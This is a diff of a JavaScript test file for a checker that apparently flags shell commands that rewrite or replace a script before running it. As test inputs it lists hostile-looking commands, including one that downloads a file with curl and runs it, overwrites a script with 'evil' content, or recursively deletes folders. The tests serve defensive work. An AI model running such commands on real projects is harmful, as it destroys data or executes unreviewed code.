@@ -114,7 +114,30 @@ test('round 3: a command that changes a script or the tree and runs a script is 
   const git = { tracked: ['a.mjs'] };
   for (const cmd of ['echo "evil" > a.mjs && node a.mjs', 'cp evil.mjs a.mjs && node a.mjs', 'git checkout other -- a.mjs && node a.mjs', 'tee a.mjs < evil.mjs; node a.mjs', 'curl -o a.mjs http://x/y && node a.mjs'])
     assert.equal((await run(proj, cmd, { git })).unread, true, cmd);
-  assert.equal((await run(proj, 'echo hi > log.txt && node a.mjs', { git })).scripts.some(s => s.path === '(command)'), false);
   assert.equal(parseCommand('echo x > out.mjs').mutates, true);
-  assert.equal(parseCommand('echo x > out.txt').mutates, false);
+});
+
+test('round 4: any write in the same command as a run counts as a change, whatever the file names', async () => {
+  const proj = tree({ ...BASE, 'stage/tools/a.mjs': 'evil', 'tools/a.mjs': 'console.log(1)' });
+  const git = { tracked: ['a.mjs'] };
+  for (const [cmd, shell] of [
+    ['cp -r stage/. . && node tools/a.mjs', 'bash'],
+    ['rm -rf tools && mv stage/tools tools && node tools/a.mjs', 'bash'],
+    ['Copy-Item -Recurse -Force stage\\* . ; node tools/a.mjs', 'powershell'],
+    ['cp -r stage/tools . && npm run build', 'bash'],
+    ['Move-Item stage\\tools tools -Force; node tools/a.mjs', 'powershell'],
+    ['Remove-Item -Recurse tools; node tools/a.mjs', 'powershell'],
+    ['New-Item x.txt; node tools/a.mjs', 'powershell'],
+    ['Set-Content log.txt hi; node tools/a.mjs', 'powershell'],
+    ['echo hi > log.txt && node tools/a.mjs', 'bash'],
+    ['echo hi | tee log.txt && node tools/a.mjs', 'bash'],
+    ['git checkout other && node tools/a.mjs', 'bash'],
+    ['git restore . && node tools/a.mjs', 'bash'],
+    ['curl -o x.txt http://x/y && node tools/a.mjs', 'bash'],
+  ]) { const r = await run(proj, cmd, { git, shell }); assert.equal(r.unread, true, `${cmd}: ${why(r)}`); assert.ok(r.scripts.some(s => s.path === '(command)' && s.kind === 'unknown'), cmd); }
+  // not writes: redirects to nowhere or to another stream, a read-only command, a folder or timestamp only
+  for (const cmd of ['node tools/a.mjs 2>&1', 'node tools/a.mjs > /dev/null 2>&1', 'mkdir -p out && node tools/a.mjs', 'touch x && node tools/a.mjs', 'git status && node tools/a.mjs', 'git add -A && git commit -m x && node tools/a.mjs'])
+    assert.equal((await run(proj, cmd, { git })).scripts.some(s => s.path === '(command)'), false, cmd);
+  // a write with nothing run in the same command is only a write
+  assert.equal((await run(proj, 'cp -r stage/. .', { git })).unread, false);
 });
